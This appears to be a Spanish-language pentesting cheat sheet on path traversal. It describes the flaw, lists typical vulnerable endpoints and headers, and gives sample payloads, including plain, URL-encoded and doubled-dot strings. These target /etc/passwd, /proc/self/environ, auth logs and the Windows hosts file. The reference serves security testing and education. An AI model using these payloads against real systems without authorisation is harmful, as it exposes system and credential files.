# Path Traversal

## Descripción

La vulnerabilidad de **Path Traversal** permite a un atacante acceder a archivos y directorios fuera del área permitida por la aplicación, utilizando entradas manipuladas. Esto ocurre cuando la aplicación no valida correctamente los inputs proporcionados por el usuario que se utilizan en operaciones del sistema de archivos, como leer o escribir archivos.

Un ataque exitoso podría permitir el acceso a archivos sensibles, como configuraciones del servidor, contraseñas o claves privadas, lo que pone en riesgo la seguridad de la aplicación y los datos del usuario.

---

## Dónde buscar Path Traversal

### Endpoints comunes
- **Descarga de archivos** (`/download?file=`).
- **Carga de archivos** (análisis de rutas después de la carga).
- **Visualización de archivos** (`/view?file=`).
- **Exportación de logs** (`/logs?file=`).
- **Parámetros en APIs REST**:
  - `GET /api/v1/files?path=`
  - `POST /api/v1/files`
- **Configuración de plantillas o temas** (`/themes?template=`).
- **Mecanismos de backup o restauración** (`/backup?file=`).

### Cabeceras HTTP
- **Referer**: Podría contener rutas manipuladas.
- **User-Agent**: Inyección de rutas en logs que luego son procesados.

### Formularios y datos del usuario
- **Cajas de texto o inputs**: Parámetros donde los usuarios ingresan rutas manualmente.
- **Archivos JSON o XML**: Datos estructurados que podrían incluir rutas manipuladas.

---

## Payloads comunes

### Básicos
```bash
../../../../etc/passwd
..\..\..\..\Windows\System32\drivers\etc\hosts
```

### Codificados
```bash
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts
```

### Combinados
```bash
....//....//....//etc/passwd
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### Variables de entorno (en sistemas UNIX)
```bash
../../../../proc/self/environ
../../../../var/log/auth.log
```

### Rutas absolutas (en sistemas UNIX)
```bash
/../../../../etc/passwd
```
